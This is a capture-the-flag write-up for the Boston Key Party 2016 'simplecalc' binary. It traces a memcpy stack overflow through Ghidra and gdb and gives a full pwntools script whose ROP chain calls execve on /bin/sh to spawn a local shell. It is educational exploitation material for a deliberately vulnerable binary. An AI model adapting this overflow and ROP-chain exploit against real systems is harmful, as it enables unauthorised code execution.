# Boston Key Part 2016 Simple Calc

Let's take a look at the binary:

```
$    file simplecalc
simplecalc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
$    pwn checksec simplecalc
[*] '/Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./simplecalc  
    |#------------------------------------#|
    |         Something Calculator         |
    |#------------------------------------#|

Expected number of calculations: 50
Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 1
Integer y: 1
Do you really need help calculating such small numbers?
Shame on you... Bye
```

So we can see that it is a 64 bit statically linked binary. The only binary mitigation it has is a Non-Executable stack so we can't push shellcode onto the stack and call it. When we run it, we see that it prompts us for a number of calculations. Then it allows us to do a number of calculations. Also it apparently won't let us calculate "small numbers". When we take a look at the main function in Ghidra (for me it was under a folder called `mai...`), we see this:

```

undefined8 main(void)

{
  void *calculations;
  undefined vulnBuf [40];
  int calcChoice;
  int numberCalcs;
  int i;
 
  numberCalcs = 0;
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  print_motd();
  printf("Expected number of calculations: ");
  __isoc99_scanf(&DAT_00494214,&numberCalcs);
  handle_newline();
  if ((numberCalcs < 0x100) && (3 < numberCalcs)) {
    calculations = malloc((long)(numberCalcs << 2));
    i = 0;
    while (i < numberCalcs) {
      print_menu();
      __isoc99_scanf(&DAT_00494214,&calcChoice);
      handle_newline();
      if (calcChoice == 1) {
        adds();
        *(undefined4 *)((long)i * 4 + (long)calculations) = add._8_4_;
      }
      else {
        if (calcChoice == 2) {
          subs();
          *(undefined4 *)((long)i * 4 + (long)calculations) = sub._8_4_;
        }
        else {
          if (calcChoice == 3) {
            muls();
            *(undefined4 *)((long)i * 4 + (long)calculations) = mul._8_4_;
          }
          else {
            if (calcChoice == 4) {
              divs();
              *(undefined4 *)((long)i * 4 + (long)calculations) = divv._8_4_;
            }
            else {
              if (calcChoice == 5) {
                memcpy(vulnBuf,calculations,(long)(numberCalcs << 2));
                free(calculations);
                return 0;
              }
              puts("Invalid option.\n");
            }
          }
        }
      }
      i = i + 1;
    }
    free(calculations);
  }
  else {
    puts("Invalid number.");
  }
  return 0;
}
```

So we can see that it starts of by prompting us for a number of calculations with the string `Expected number of calculations: `. It stores the number of calculations in `numberCalcs`. Then it checks to make sure the number of calculations is between `3` and `0x100` (If not it will print `Invalid number.` and just return). It will then malloc a size equal to `numberCalcs << 2` and store the pointer to it in `calculations`. This is the same operation as `numberCalcs * 4`. Just check out these calculations to see:

```
>>> 5 << 2
20
>>> 500 << 2
2000
>>> 500 * 4
2000
>>> 742 << 2
2968
>>> 742 * 4
2968
```

Here it is essentially allocating `numberCalcs` number of integers, which each of them are four bytes big. Then it will enter into a while loop that will run once for each calculation we will specify (unless if we choose to exit early). Looking at the assembly code (since the decompilation looks a bit weird) for the multiplication section, we see that it is calling the `muls` function:

```
        004014d3 83 f8 03        CMP        calculations,0x3
        004014d6 75 23           JNZ        LAB_004014fb
        004014d8 e8 cb fd        CALL       muls                                             undefined muls()
                 ff ff
```

When we look at the `muls`function, we see that it checks to ensure that the two numbers have to be equal to or greater than `0x27`. Looking at it, we see that it pretty much just multiplies the two numbers together. Looking at the other three calculation operations, they seem pretty similar (except for subtraction, addition, and division).

```
void muls(void)

{
  printf("Integer x: ");
  __isoc99_scanf(&DAT_00494214,mul);
  handle_newline();
  printf("Integer y: ");
  __isoc99_scanf(&DAT_00494214,0x6c4aa4);
  handle_newline();
  if ((0x27 < mul._0_4_) && (0x27 < mul._4_4_)) {
    mul._8_4_ = mul._4_4_ * mul._0_4_;
    printf("Result for x * y is %d.\n\n",(ulong)mul._8_4_);
    return;
  }
  puts("Do you really need help calculating such small numbers?\nShame on you... Bye");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

However we can see that there is a bug that resides in the option to save and exit:

```
              if (calcChoice == 5) {
                memcpy(vulnBuf,calculations,(long)(numberCalcs << 2));
                free(calculations);
                return 0;
              }
```

If we choose this option, it will use `memcpy` to copy over all of our calculations into `vulnBuf`. Thing is it doesn't do a size check, so if we have enough calculations we can overflow the buffer and overwrite the return address (there is no stack canary to prevent this). Let's find the offset from the start of our input to the return address. We start off by setting a breakpoint for right after the `memcpy` call, then seeing where our input lands (also `321456948` in hex is `0x13290b34`):

```
gef➤  b *0x40154a
Breakpoint 1 at 0x40154a
gef➤  r
Starting program: /Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc

  |#------------------------------------#|
  |         Something Calculator         |
  |#------------------------------------#|

Expected number of calculations: 50
Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 159
Integer y: 321456789
Result for x + y is 321456948.

Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffde60  →  0x0000000013290b34
$rbx   : 0x00000000004002b0  →  <_init+0> sub rsp, 0x8
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffde50  →  0x00007fffffffdf88  →  0x00007fffffffe2c3  →  "/Hackery/pod/modules/bof_static/bkp16_simplecalc/s[...]"
$rbp   : 0x00007fffffffdea0  →  0x0000000000000000
$rsi   : 0x00000000006c8ca8  →  0x0000000000020361
$rdi   : 0x00007fffffffdf28  →  0x0000000000000000
$rip   : 0x000000000040154a  →  <main+455> mov rax, QWORD PTR [rbp-0x10]
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x0               
$r12   : 0x0               
$r13   : 0x0000000000401c00  →  <__libc_csu_init+0> push r14
$r14   : 0x0000000000401c90  →  <__libc_csu_fini+0> push rbx
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde50│+0x0000: 0x00007fffffffdf88  →  0x00007fffffffe2c3  →  "/Hackery/pod/modules/bof_static/bkp16_simplecalc/s[...]"  ← $rsp
0x00007fffffffde58│+0x0008: 0x0000000100400d41 ("A\r@"?)
0x00007fffffffde60│+0x0010: 0x0000000013290b34   ← $rax
0x00007fffffffde68│+0x0018: 0x0000000000000000
0x00007fffffffde70│+0x0020: 0x0000000000000000
0x00007fffffffde78│+0x0028: 0x0000000000000000
0x00007fffffffde80│+0x0030: 0x0000000000000000
0x00007fffffffde88│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40153d <main+442>       rex.RB ror BYTE PTR [r8-0x77], 0xce
     0x401542 <main+447>       mov    rdi, rax
     0x401545 <main+450>       call   0x4228d0 <memcpy>
 →   0x40154a <main+455>       mov    rax, QWORD PTR [rbp-0x10]
     0x40154e <main+459>       mov    rdi, rax
     0x401551 <main+462>       call   0x4156d0 <free>
     0x401556 <main+467>       mov    eax, 0x0
     0x40155b <main+472>       jmp    0x401588 <main+517>
     0x40155d <main+474>       mov    edi, 0x494402
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "simplecalc", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40154a → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x000000000040154a in main ()
gef➤  search-pattern 0x13290b34
[+] Searching '0x13290b34' in memory
[+] In '[heap]'(0x6c3000-0x6e9000), permission=rw-
  0x6c4a88 - 0x6c4a98  →   "\x34\x0b\x29\x13[...]"
  0x6c8be0 - 0x6c8bf0  →   "\x34\x0b\x29\x13[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffb0c8 - 0x7fffffffb0d8  →   "\x34\x0b\x29\x13[...]"
  0x7fffffffde60 - 0x7fffffffde70  →   "\x34\x0b\x29\x13[...]"
gef➤  i f
Stack level 0, frame at 0x7fffffffdeb0:
 rip = 0x40154a in main; saved rip = 0x0
 Arglist at 0x7fffffffdea0, args:
 Locals at 0x7fffffffdea0, Previous frame's sp is 0x7fffffffdeb0
 Saved registers:
  rbp at 0x7fffffffdea0, rip at 0x7fffffffdea8
```

So we can see that the offset between the start of our input and the return address is `0x7fffffffdea8 - 0x7fffffffde60 = 0x48`, which will be `18` integers. Now for what to execute when we get the return address. Since the binary is statically linked and there is no PIE, we can just build a rop chain using the binary for gadgets and without an infoleak. The ROP Chain will essentially just make an execve syscall to `/bin/sh`. There are four registers that we need to control in order to make this syscall (checkout https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ for more details):

```
rax:  0x3b              Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables
```

To do this, we will need gadgets to control those four register. I typically like to go with gadgets like `pop rax; ret`, since it makes it simple. We will also need a gadget to write the string `/bin/sh` somewhere in memory that we know. Let's find our gadgets using ROPGadget (checkout https://github.com/JonathanSalwan/ROPgadget ):

```
$ python ROPgadget.py --binary simplecalc | grep "pop rax ; ret"
0x000000000044db32 : add al, ch ; pop rax ; ret
0x000000000040b032 : add al, ch ; pop rax ; retf 2
0x000000000040b02f : add byte ptr [rax], 0 ; add al, ch ; pop rax ; retf 2
0x000000000040b030 : add byte ptr [rax], al ; add al, ch ; pop rax ; retf 2
0x00000000004b0801 : in al, 0x4c ; pop rax ; retf
0x000000000040b02e : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; pop rax ; retf 2
0x0000000000474855 : or dh, byte ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
0x000000000044db34 : pop rax ; ret
0x000000000045d707 : pop rax ; retf
0x000000000040b034 : pop rax ; retf 2
0x0000000000474857 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
$ python ROPgadget.py --binary simplecalc | grep "pop rdi ; ret"
0x000000000044bbbc : inc dword ptr [rbx - 0x7bf0fe40] ; pop rdi ; ret
0x0000000000401b73 : pop rdi ; ret
$ python ROPgadget.py --binary simplecalc | grep "pop rsi ; ret"
0x00000000004ac9b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rsi ; ret
0x00000000004ac9b6 : add byte ptr [rax], al ; pop rsi ; ret
0x0000000000437aa9 : pop rdx ; pop rsi ; ret
0x0000000000401c87 : pop rsi ; ret
$ python ROPgadget.py --binary simplecalc | grep "pop rdx ; ret"
0x00000000004a868c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rdx ; ret 0x45
0x00000000004a868e : add byte ptr [rax], al ; pop rdx ; ret 0x45
0x00000000004afd61 : js 0x4afde1 ; pop rdx ; retf
0x0000000000414ed0 : or al, ch ; pop rdx ; ret 0xffff
0x0000000000437a85 : pop rdx ; ret
0x00000000004a8690 : pop rdx ; ret 0x45
0x00000000004b2dd8 : pop rdx ; ret 0xfffd
0x0000000000414ed2 : pop rdx ; ret 0xffff
0x00000000004afd63 : pop rdx ; retf
0x000000000044af60 : pop rdx ; retf 0xffff
0x00000000004560ae : test byte ptr [rdi - 0x1600002f], al ; pop rdx ; ret
```

So we can see the gadgets for controlling the four registers are at `0x44db34`, `0x401b73`, `0x401c87`, and `0x437a85`. Now we need a gadget that will write an eight byte value to a memory region. For this I would like to start my search by searching through the gadgets with `mov` in them:

```
$ python ROPgadget.py --binary simplecalc | grep "mov" | less
```

after a bit of searching, we find this gadget:

```
0x000000000044526e : mov qword ptr [rax], rdx ; ret
```

This gadget will move the four byte value from `rdx` to whatever memory is pointed to by `rax`. This is exactly what we need, and a bit convenient since we already have the gadgets for those two registers and this gadget doesn't do anything else that we need to worry about. The last gadget we need will be a `syscall` gadget:

```
$ python ROPgadget.py --binary simplecalc | grep ": syscall"
0x0000000000400488 : syscall
```

There are two more things we need to figure out. The first is where in memory we will write the string `/bin/sh`. Let's check the memory mappings while the binary is running:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004c1000 0x0000000000000000 r-x /Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc
0x00000000006c0000 0x00000000006c3000 0x00000000000c0000 rw- /Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc
0x00000000006c3000 0x00000000006c6000 0x0000000000000000 rw-
0x0000000001971000 0x0000000001994000 0x0000000000000000 rw- [heap]
0x00007fffbde39000 0x00007fffbde5a000 0x0000000000000000 rw- [stack]
0x00007fffbdfe6000 0x00007fffbdfe9000 0x0000000000000000 r-- [vvar]
0x00007fffbdfe9000 0x00007fffbdfeb000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  x/g 0x6c0000
0x6c0000: 0x200e41280e41300e
gef➤  x/20g 0x6c0000
0x6c0000: 0x200e41280e41300e  0x0e42100e42180e42
0x6c0010: 0x00000000000b4108  0x0000d0a40000002c
0x6c0020: 0x0000006cfffd1fd0  0x080e0a69100e4400
0x6c0030: 0x0b42080e0a460b4b  0x0e470b49080e0a57
0x6c0040: 0x0000000000000008  0x0000d0d400000024
0x6c0050: 0x00000144fffd2010  0x5a020283100e4500
0x6c0060: 0x0ee3020b41080e0a  0x0000000000000008
0x6c0070: 0x0000d0fc00000064  0x0000026cfffd2138
0x6c0080: 0x0e47028f100e4200  0x048d200e42038e18
0x6c0090: 0x300e41058c280e42  0x440783380e410686
gef➤  x/20g 0x6c1000
0x6c1000: 0x0000000000000000  0x0000000000000000
0x6c1010: 0x0000000000000000  0x0000000000431070
0x6c1020: 0x0000000000430a40  0x0000000000428e20
0x6c1030: 0x00000000004331b0  0x0000000000424c50
0x6c1040: 0x000000000042b940  0x0000000000423740
0x6c1050: 0x00000000004852d0  0x00000000004178d0
0x6c1060: 0x0000000000000000  0x0000000000000000
0x6c1070 <_dl_tls_static_size>: 0x0000000000001180  0x0000000000000000
0x6c1080 <_nl_current_default_domain>:  0x00000000004945f7  0x0000000000000000
0x6c1090 <locale_alias_path.10061>: 0x000000000049462a  0x00000000006c32a0
```

We see that the memory region that begins at `0x6c0000` and ends at `0x6c3000` looks like a good candidate. The permissions allow us to read and write to it. In addition to that it is mapped from the binary, and since there is no PIE the addresses will be the same every time (no infoleak needed). Looking a bit through the memory, `0x6c1000` looks like it's empty so we should be able to write to it without messing ip anything (although we could be wrong with that).

The second thing we need to worry about deals with what we are overflowing on the stack.

```
  void *calculations;
  undefined vulnBuf [40];
  int calcChoice;
  int numberCalcs;
  int i;
```

We see that between `vulnBuf` and the bottom of the stack (where the return address resides) is the pointer `calculations`. This will get overwritten as part of the overflow. This is a problem since this address is freed prior to our code being executed:

```
                memcpy(vulnBuf,calculations,(long)(numberCalcs << 2));
                free(calculations);
                return 0;
```

However looking at the source code for free tells us something extremely helpful in this instance (I found it here: https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#free ):
```
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */
  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }
  if (mem == 0)                              /* free(0) has no effect */
    return;
```

We can see here that if the argument we pass to free is a null pointer (`0x0`) then it just returns. Since the function writing the data for the overflow is `memcpy`, we can write null bytes. So if we just fill up the space between the start of our input and the return address with null bytes, we will be fine.

With that, we have everything we need to make the exploit. In the comments, you can find the exact ROP chain I used as well as what each part does. Also I wrote some helper functions which will write the values I want using addition:

```
from pwn import *

target = process('./simplecalc')
#gdb.attach(target, gdbscript = 'b *0x40154a')

target.recvuntil('calculations: ')
target.sendline('100')

# Establish our rop gadgets
popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85

# 0x000000000044526e : mov qword ptr [rax], rdx ; ret
movGadget = 0x44526e

syscall = 0x400488

# These two functions are what we will use to give input via addition
def addSingle(x):
  target.recvuntil("=> ")
  target.sendline("1")
  target.recvuntil("Integer x: ")
  target.sendline("100")
  target.recvuntil("Integer y: ")
  target.sendline(str(x - 100))


def add(z):
  x = z & 0xffffffff
  y = ((z & 0xffffffff00000000) >> 32)
  addSingle(x)
  addSingle(y)

# Fill up the space between the start of our input and the return address
for i in xrange(9):
  # Fill it up with null bytes, to make the ptr passed to free be a null pointer
  # So free doesn't crash
  add(0x0)

# Start writing th0e rop chain
'''
This is our ROP Chain

Write "/bin/sh" tp 0x6c1000

pop rax, 0x6c1000 ; ret
pop rdx, "/bin/sh\x00" ; ret
mov qword ptr [rax], rdx ; ret

# Move the needed values into the registers
pop rax, 0x3b ; ret
pop rdi, 0x6c1000 ; ret
pop rsi, 0x0 ; ret
pop rdx, 0x0 ; ret
'''
add(popRax)
add(0x6c1000)
add(popRdx)
add(0x0068732f6e69622f) # "/bin/sh" in hex
add(movGadget)

add(popRax) # Specify which syscall to make
add(0x3b)

add(popRdi) # Specify pointer to "/bin/sh"
add(0x6c1000)

add(popRsi) # Specify no arguments or environment variables
add(0x0)
add(popRdx)
add(0x0)

add(syscall) # Syscall instruction

target.sendline('5') # Save and exit to execute memcpy and trigger buffer overflow

# Drop to an interactive shell to use our new shell
target.interactive()
```

When we run the exploit:

```
$ python exploit.py
[+] Starting local process './simplecalc': pid 15676
[*] Switching to interactive mode
Result for x + y is 0.

Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> $ w
 20:06:39 up  5:53,  1 user,  load average: 1.71, 1.30, 1.37
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               14:13   ?xdm?  22:10   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
core  exploit.py  readme.md  simplecalc
```

Just like that, we popped a shell!